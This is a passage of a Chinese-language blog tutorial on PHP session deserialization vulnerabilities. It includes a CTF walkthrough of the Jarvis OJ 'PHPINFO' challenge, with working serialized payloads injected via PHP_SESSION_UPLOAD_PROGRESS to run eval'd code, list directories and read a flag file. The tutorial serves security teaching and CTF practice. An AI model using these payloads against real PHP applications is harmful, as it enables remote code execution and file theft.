class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//这里把不需要修改的类内容都可以删掉，防止POP链过长</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;D:\\.pem&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Show%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>source%<span class="number">22</span>%<span class="number">3</span>Br%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Modifier%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>C.pem%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127171236.png"></p><h2 id="0x4-PHP-Session反序列化"><a href="#0x4-PHP-Session反序列化" class="headerlink" title="0x4.PHP Session反序列化"></a>0x4.PHP Session反序列化</h2><h3 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h3><h3 id="session请求过程"><a href="#session请求过程" class="headerlink" title="session请求过程"></a>session请求过程</h3><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p><h3 id="session-start的作用"><a href="#session-start的作用" class="headerlink" title="session_start的作用"></a>session_start的作用</h3><p><img src="https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201003174021765-253947050.png"></p><h3 id="PHP-session存储机制"><a href="#PHP-session存储机制" class="headerlink" title="PHP session存储机制"></a>PHP session存储机制</h3><p>php session存放在文件中，默认在tmp目录。存储的文件是以sess_sessionid来进行命名的，文件的内容就是Session值的序列化之后的内容</p><p>PHP session有三种序列化方式，分别是php, php_serialize, php_binary</p><table><thead><tr><th><strong>存储引擎</strong></th><th><strong>存储方式</strong></th></tr></thead><tbody><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值</td></tr><tr><td>php</td><td>键名 + 竖线 + 经过 serialize() 函数序列处理的值</td></tr><tr><td>php_serialize</td><td>(PHP&gt;5.5.4) 经过 serialize() 函数序列化处理的数组</td></tr></tbody></table><h4 id="序列化存储引擎1-php"><a href="#序列化存储引擎1-php" class="headerlink" title="序列化存储引擎1 - php"></a>序列化存储引擎1 - php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128092503.png"></p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128092536.png"></p><p>username|s:8:”zhangsan”;</p><p>$_SESSION[‘username’]的键名|GET参数的类型:长度:”值”;</p><p>$_SESSION[‘username’]的键名|GET参数经过序列化后的值</p><h4 id="序列化存储引擎2-php-serialize"><a href="#序列化存储引擎2-php-serialize" class="headerlink" title="序列化存储引擎2 - php_serialize"></a>序列化存储引擎2 - php_serialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128093426.png"></p><p>a:1:{s:8:”username”;s:8:”zhangsan”;}</p><p>GET参数经过序列化后的值</p><h4 id="序列化存储引擎3-php-binary"><a href="#序列化存储引擎3-php-binary" class="headerlink" title="序列化存储引擎3 - php_binary"></a>序列化存储引擎3 - php_binary</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128093644.png"></p><p>usernames:8:”zhangsan”;</p><p>键名长度的ASCII字符+$_SESSION[‘username’]的键名:GET参数的长度:”参数值”</p><h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><p>PHP session存储和读取时，都会有一个序列化和反序列化过程</p><blockquote><p>漏洞成因：使用不同的引擎来处理session文件</p></blockquote><h4 id="SESSION可赋值"><a href="#SESSION可赋值" class="headerlink" title="$_SESSION可赋值"></a>$_SESSION可赋值</h4><p>程序使用两个引擎来分别处理的话就会出现问题。比如下面的例子，先使用php_serialize引擎来存储Session：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-4-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再用php引擎读取Session:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-4-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&quot; !&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>漏洞的主要原因在于不同的引擎对于竖杠’ | ‘的解析产生歧义</p><p>对于php_serialize引擎来说’ | ‘可能只是一个正常的字符；</p><p>对于php引擎来说’ | ‘就是分隔符，前面是$_SESSION[‘username’]的键名 ，后面是GET参数经过serialize序列化后的值。</p><p>从而在解析的时候造成了歧义，导致其在解析Session文件时直接对’ | ‘后的值进行反序列化处理</p><p>这里有个小问题？为什么进行了反序列化触发了__wakeup()?</p><ul><li>因为使用了session_start()这个函数。当现有的会话以特殊的反序列化格式存储，php就会自动反序列化数据填充至$_SESSION</li></ul><p>构造payload改写$this-&gt;name：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> user();</span><br><span class="line">    <span class="variable">$a</span>-&gt;name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;age = <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;zhangsan&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>这里不能把这个payload直接传上去，因为接收的参数是经过php引擎进行反序列化，所以要在前面加 |</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;zhangsan&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128103039.png"></p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128103256.png"></p><h4 id="SESSION不可赋值"><a href="#SESSION不可赋值" class="headerlink" title="$_SESSION不可赋值"></a>$_SESSION不可赋值</h4><p>如果代码中不存在对$_SESSION变量赋值，怎么利用?   这里使用 Session上传进度</p><p>在PHP存在upload_process机制（php &gt;= 5.4.0），即自动在$_SESSION中创建一个键值对（key:value），value中刚好存在用户可控的部分，这个功能在文件上传的过程中利用session实时返回上传的进度。</p><p>此漏洞需要session.upload_progress.enabled为on，在上传文件的时候同时POST一个与session.upload_process.name的同名变量。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。下次请求就会反序列化session文件，从中取出这个键</p><h5 id="实例-Jarvis-OJ-PHPINFO"><a href="#实例-Jarvis-OJ-PHPINFO" class="headerlink" title="实例 - Jarvis OJ - PHPINFO"></a>实例 - Jarvis OJ - PHPINFO</h5><p><a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码使用php引擎进行读取[反序列化]session</p><p>传入任意phpinfo参数都会执行eval(phpinfo();)</p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128110128.png"></p><ul><li><p>通过读取phpinfo，得知默认的session存储引擎为php_serialize，和题目读取引擎不同，会造成漏洞</p></li><li><p>session.upload_progress.enabled 为 On，可以使用session上传进度利用</p></li><li><p>session.upload_progress.name 为 PHP_SESSION_UPLOAD_PROGRESS，可以创建表单向远程服务器发送数据</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.html</span></span><br><span class="line">&lt;form action=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> / &gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ul><li>构造payload</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前面加|</span></span><br><span class="line">|O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>文件上传的时候使用burp抓包，在 PHP_SESSION_UPLOAD_PROGRESS 的 value 值中添加payload</p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128111548.png"></p><ul><li>payload2:获取flag路径</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(dirname(__FILE__));&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">|O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;print_r(dirname(__FILE__));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128112624.png"></p><ul><li>payload3:读取flag</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">|O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">88</span>:<span class="string">&quot;print_r(file_get_contents(&quot;</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="string">&quot;));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128112920.png"></p><p>$flag=”CTF{4d96e37f4be998c50aa586de4ada354a}”;</p><h3 id="session反序列化POP"><a href="#session反序列化POP" class="headerlink" title="session反序列化POP"></a>session反序列化POP</h3><h4 id="实例1-普通POP"><a href="#实例1-普通POP" class="headerlink" title="实例1 - 普通POP"></a>实例1 - 普通POP</h4><p>首先需要对php.ini做配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.auto_start ＝ Off</span><br><span class="line"><span class="attr">session.serialize_handler</span> = php_serialize</span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="number">0</span>ff</span><br></pre></td></tr></table></figure><ul><li>session.auto_start = on 表示PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()，这里需要关闭</li><li>session.serialize_handler = php_serialize 表示默认使用php_serialize引擎进行存储</li><li>session.upload_progress.cleanup = On 导致文件上传后，Session文件内容立即清空，这里需要关闭</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-5-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_string(file_get_contents(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));            </span><br><span class="line"><span class="comment">//show_source(__FILE__);    </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 